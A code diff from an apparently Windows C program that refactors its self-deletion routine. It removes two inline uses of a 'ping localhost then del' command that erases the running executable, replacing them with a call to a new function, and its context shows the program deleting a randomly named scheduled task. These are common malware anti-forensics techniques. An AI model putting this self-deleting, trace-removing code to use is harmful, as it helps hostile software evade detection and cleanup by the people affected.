@@ -34,14 +34,7 @@ bool admin_check() {
     }
 
     if (!is_admin) {
-        // reused from safe()
-        char cmd[MAX_PATH + 64];
-        GetModuleFileNameA(NULL, cmd, MAX_PATH);
-        char rm_cmd[MAX_PATH + 128];
-        sprintf(rm_cmd,
-        "cmd /c ping 127.0.0.1 -n 2 > nul && del \"%s\"", cmd);
-        system(rm_cmd);
-        return 1;
+        self_del_new();
     }
     return is_admin;
 }
@@ -149,13 +142,7 @@ void safe() {
     sprintf(cmd, "schtasks /delete /tn \"%s\" /f", rand_nm);
     system(cmd);
     
-    //delete itself
-    //uses localhost as a delay method 
-    char cmd[MAX_PATH + 64];
-    GetModuleFileNameA(NULL, cmd, MAX_PATH);
-    char rm_cmd[MAX_PATH + 128];
-    sprintf(rm_cmd, "cmd /c ping 127.0.0.1 -n 2 > nul && del \"%s\"", cmd);
-    system(rm_cmd);
+    self_del_new();
 
 }
 void game() {
